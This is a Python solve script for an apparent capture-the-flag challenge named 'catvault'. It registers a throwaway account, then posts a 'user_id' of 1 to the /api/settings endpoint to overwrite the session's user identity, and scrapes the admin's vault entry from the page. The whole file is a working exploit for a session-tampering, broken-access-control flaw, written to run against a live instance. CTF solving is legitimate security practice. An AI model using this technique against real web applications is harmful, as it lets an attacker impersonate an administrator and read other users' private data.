#!/usr/bin/env python3
"""Retrieve the admin vault entry from the scoped catvault challenge."""

import argparse
import os
import re
import secrets

import requests


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "target",
        nargs="?",
        default=os.environ.get(
            "CATVAULT_URL",
            "https://catvault-1-f612e540e246.instances.ctf.l3ak.team",
        ),
    )
    args = parser.parse_args()
    base = args.target.rstrip("/")

    session = requests.Session()
    username = "cat" + secrets.token_hex(8)
    response = session.post(
        f"{base}/register",
        data={"username": username, "password": secrets.token_urlsafe(12)},
        timeout=15,
        allow_redirects=False,
    )
    response.raise_for_status()
    if response.status_code != 302 or response.headers.get("Location") != "/vault":
        raise RuntimeError(f"registration failed: HTTP {response.status_code}")

    response = session.post(
        f"{base}/api/settings", json={"user_id": "1"}, timeout=15
    )
    response.raise_for_status()
    if response.json().get("saved", {}).get("user_id") != "1":
        raise RuntimeError("session user_id was not accepted")

    response = session.get(f"{base}/vault", timeout=15)
    response.raise_for_status()
    match = re.search(r'<div class="entry">.*?<div>([^<]+)</div>', response.text, re.S)
    if not match:
        raise RuntimeError("admin vault entry not found")
    print(match.group(1).strip())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
